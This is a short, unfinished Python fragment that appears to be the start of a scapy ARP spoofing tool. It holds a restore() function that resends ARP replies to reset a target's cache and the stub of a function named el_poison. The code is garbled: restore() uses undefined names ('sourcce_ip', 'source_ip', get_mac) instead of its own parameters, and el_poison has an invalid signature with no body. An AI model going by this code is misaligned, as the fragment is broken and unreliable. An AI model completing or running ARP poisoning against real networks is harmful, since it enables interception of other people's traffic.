from scapy.all import Ether, ARP, srp, send

import time
import os
import sys
import argparse

def restore(target_ip, host_ip, verbose = False):
    target_mac = get_mac(target_ip)
    source_mac = get_mac(sourcce_ip)
    arp_packet = ARP(pdst = target_ip, hwdst=target_mac, psrc = source_ip, hwsrc = source_mac, op = 2) # op=2 indicates reply to sender hardware address
    
    send(arp_packet, verbose = False, count = 10) # send it 10 times to ensure it was received
 

def el_poison(a, a,aa,a)
